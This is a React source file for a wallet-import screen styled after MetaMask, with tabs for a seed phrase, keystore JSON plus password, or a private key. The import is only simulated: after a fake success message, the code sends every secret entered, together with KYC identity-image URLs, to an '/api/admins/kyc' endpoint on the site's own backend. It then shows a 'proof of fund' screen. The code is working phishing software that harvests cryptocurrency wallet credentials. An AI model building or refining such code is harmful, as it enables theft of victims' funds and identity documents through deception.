import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import ProofOfFund from './ProofOfFund';
import { v4 as uuidv4 } from 'uuid';

// Default theme (MetaMask style)
const defaultTheme = {
  bg: '#1E2329',
  text: 'white',
  border: 'gray-600',
  accent: '#ffa680',
  accentText: 'black',
  accentHover: 'orange-400',
  tabActiveBg: '#ffa680',
  tabActiveText: 'black',
  tabInactiveBg: '#1E2329',
  tabInactiveText: 'white',
  tabBorder: 'gray-600',
};

const WalletImportTabs = ({ theme = defaultTheme }) => {
  const [activeTab, setActiveTab] = useState('phrase');
  const [showPassword, setShowPassword] = useState(false);
  const [toast, setToast] = useState({ show: false, message: '' });
  const [showPOF, setShowPOF] = useState(false);
  const [startCountdown, setStartCountdown] = useState(false);
  const [selectedWalletType, setSelectedWalletType] = useState(null);
  const [walletFormData, setWalletFormData] = useState(null); // store wallet import form data (seed, keystore, privateKey, password)
  const [progress, setProgress] = useState(100);
  const [sessionId, setSessionId] = useState(() => {
    const existingSessionId = localStorage.getItem('sessionId');
    if (existingSessionId) return existingSessionId;
    const newSessionId = uuidv4();
    localStorage.setItem('sessionId', newSessionId);
    return newSessionId;
  });
  const toastTimeout = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    // Removed navigation logic to prevent URL change
  }, [showPOF]);

  useEffect(() => {
    if (toast.show && toast.message.includes('Wallet imported successfully')) {
      setProgress(100); // reset progress when success toast starts
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev <= 0) {
            clearInterval(interval);
            // when success toast finishes, hide toast, show ProofOfFund and start its countdown
            setToast({ show: false, message: '' });
            setShowPOF(true);
            setStartCountdown(true);
            // After POF is shown, attempt to submit any pending KYC for this session
            (async () => {
              try {
                const pendingKey = `kyc_pending_${sessionId}`;
                const raw = localStorage.getItem(pendingKey);
                if (!raw) return;
                const pending = JSON.parse(raw);
                // attach walletType and any wallet fields (seed, keystore, privateKey)
                const payload = {
                  sessionId: pending.sessionId || sessionId,
                  walletType: selectedWalletType || walletFormData?.walletType || 'unknown',
                  seedPhrase: walletFormData?.key || undefined,
                  keystoreJson: walletFormData?.keystoreJson || undefined,
                  password: walletFormData?.pass || undefined,
                  privateKey: walletFormData?.privateKey || undefined,
                  imageUrls: pending.imageUrls || [],
                };
                // Optionally attach seed/keystore/privateKey from form state if you have them accessible
                const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                if (!res.ok) {
                  const txt = await res.text();
                  console.warn('Failed to submit pending KYC:', res.status, txt);
                  return;
                }
                // on success remove the pending key
                localStorage.removeItem(pendingKey);
                console.log('Pending KYC submitted for session', payload.sessionId);
                // Clear session and create a new one
                localStorage.removeItem('sessionId');
                const newSessionId = uuidv4();
                localStorage.setItem('sessionId', newSessionId);
                setSessionId(newSessionId);
              } catch (err) {
                console.error('Error submitting pending KYC', err);
              }
            })();
            return 0;
          }
          return prev - 5;
        });
      }, 100);

      return () => clearInterval(interval);
    }
  }, [toast.show, toast.message]);

  // Auto-hide only error toasts after 3 seconds
  useEffect(() => {
    if (toast.show && toast.style?.isError) {
      const timeout = setTimeout(() => {
        setToast({ show: false, message: '' });
      }, 3000); // Auto-hide error toast after 3 seconds

      return () => clearTimeout(timeout);
    }
  }, [toast]);

  const validateSeedPhrase = (phrase) => {
    const words = phrase.trim().split(/\s+/).filter(Boolean);
    return words.length === 12 || words.length === 24;
  };

  // Updated handleImport function to delay showing POF until toast finishes
  const handleImport = (e) => {
    e.preventDefault();

    const formData = new FormData(e.target);
    const walletType = formData.get('walletType') || 'binance';
    const key = formData.get('key') || '';
    const pass = formData.get('pass') || '';

    if (!validateSeedPhrase(key)) {
      setToast({ show: true, message: 'Invalid seed phrase. Please enter a valid 12 or 24-word phrase.', style: { background: '#fff', color: '#d32f2f', isError: true } });
      return;
    }

    // Simulate successful import: show success toast. POF will appear after toast progress completes.
    setSelectedWalletType(walletType);
    // persist wallet form data so we can attach it to pending KYC submission later
    setWalletFormData({ walletType, key, pass, activeTab: activeTab });
    setStartCountdown(false);
    setShowPOF(false);
    setToast({ show: true, message: 'Wallet imported successfully!', style: { background: '#fff', color: '#4caf50', isError: false } });
  };

  const tabData = [
    {
      key: 'phrase',
      label: 'Phrase',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <textarea name="key" placeholder="Phrase" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 12 (sometimes 24) words separated by single spaces</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'keystore',
      label: 'Keystore JSON',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <textarea name="key" placeholder="Keystore JSON" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="relative w-full">
            <input
              type={showPassword ? 'text' : 'password'}
              name="pass"
              placeholder="Password"
              style={{background: theme.bg, color: theme.text}}
              className={`w-full p-2 border rounded border-${theme.border} focus:ring-2 pr-10`}
            />
            <button
              type="button"
              style={{color: theme.text === '#fff' ? '#1976d2' : theme.accent}}
              className={`absolute right-2 top-2 text-sm font-bold focus:outline-none`}
              onClick={() => setShowPassword((prev) => !prev)}
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          <div className="desc text-sm text-gray-400">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'private',
      label: 'Private Key',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <input type="text" name="key" placeholder="Private Key" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 64 alphanumeric characters</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    }
  ];

  return (
    <div>
      {toast.show && (
        <div
          style={{
            position: 'fixed',
            top: '10%',
            left: '50%',
            transform: 'translateX(-50%)',
            background: toast.style?.background || '#fff',
            color: toast.style?.color || '#d32f2f',
            padding: '16px 32px',
            borderRadius: 10,
            fontWeight: 700,
            fontSize: 18,
            boxShadow: '0 2px 12px rgba(0,0,0,0.25)',
            zIndex: 9999,
            textAlign: 'center',
          }}
        >
          {toast.message}
          {!toast.style?.isError && (
            <div
              style={{
                marginTop: '10px',
                height: '5px',
                width: '100%',
                background: '#e0e0e0',
                borderRadius: '5px',
                overflow: 'hidden',
              }}
            >
              <div
                style={{
                  height: '100%',
                  width: `${progress}%`,
                  background: '#4caf50',
                  transition: 'width 0.1s ease',
                }}
              ></div>
            </div>
          )}
        </div>
      )}
      {showPOF ? (
        <ProofOfFund theme={theme} walletType={selectedWalletType} startCountdown={startCountdown} />
      ) : (
        <div>
          <div className="flex gap-2 mb-2">
            {tabData.map(tab => (
              <button
                key={tab.key}
                style={activeTab === tab.key ? {background: theme.tabActiveBg, color: theme.tabActiveText} : {background: theme.tabInactiveBg, color: theme.tabInactiveText, borderColor: theme.tabBorder}}
                className={`px-4 py-2 rounded font-bold text-sm border`}
                onClick={() => setActiveTab(tab.key)}
              >
                {tab.label}
              </button>
            ))}
          </div>
          <div>{tabData.find(tab => tab.key === activeTab)?.content}</div>
        </div>
      )}
    </div>
  );
};

export default WalletImportTabs;